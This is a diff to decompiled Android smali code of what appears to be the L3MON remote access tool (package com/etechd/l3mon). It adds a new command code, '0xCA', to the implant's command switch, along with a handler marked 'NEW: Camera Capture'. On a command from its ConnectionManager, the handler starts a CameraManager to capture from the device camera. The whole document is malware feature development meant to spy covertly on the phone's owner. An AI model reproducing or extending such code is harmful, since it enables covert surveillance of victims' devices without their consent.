@@ -298,6 +298,20 @@
 
     goto :goto_0
 
+    :sswitch_12
+    const-string v4, "0xCA"
+
+    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
+
+    move-result v4
+
+    if-eqz v4, :cond_0
+
+    const/16 v3, 0x12
+
+    goto :goto_0
+
+
     :try_end_0
     .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
 
@@ -447,6 +461,24 @@
     move-result v0
 
     invoke-static {v0}, Lcom/etechd/l3mon/ConnectionManager;->MI(I)V
+
+    goto :goto_1
+
+    :pswitch_12 # NEW: Camera Capture
+    const-string v0, "camera"
+
+    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I
+
+    move-result v0
+
+    new-instance v1, Lcom/etechd/l3mon/CameraManager;
+
+    sget-object v2, Lcom/etechd/l3mon/ConnectionManager;->context:Landroid/content/Context;
+
+    invoke-direct {v1, v2}, Lcom/etechd/l3mon/CameraManager;-><init>(Landroid/content/Context;)V
+
+    invoke-virtual {v1, v0}, Lcom/etechd/l3mon/CameraManager;->startUp(I)V
+
 
     .line 79
     goto :goto_1
@@ -606,6 +638,7 @@
         0x179d89 -> :sswitch_f # 0xHO
         0x179e8d -> :sswitch_10 # 0xSO
         0x179d27 -> :sswitch_11 # 0xGF
+        0x179bc6 -> :sswitch_12 # 0xCA
     .end sparse-switch
 
     :pswitch_data_0
@@ -628,5 +661,6 @@
         :pswitch_f
         :pswitch_10
         :pswitch_11
+        :pswitch_12
     .end packed-switch
 .end method
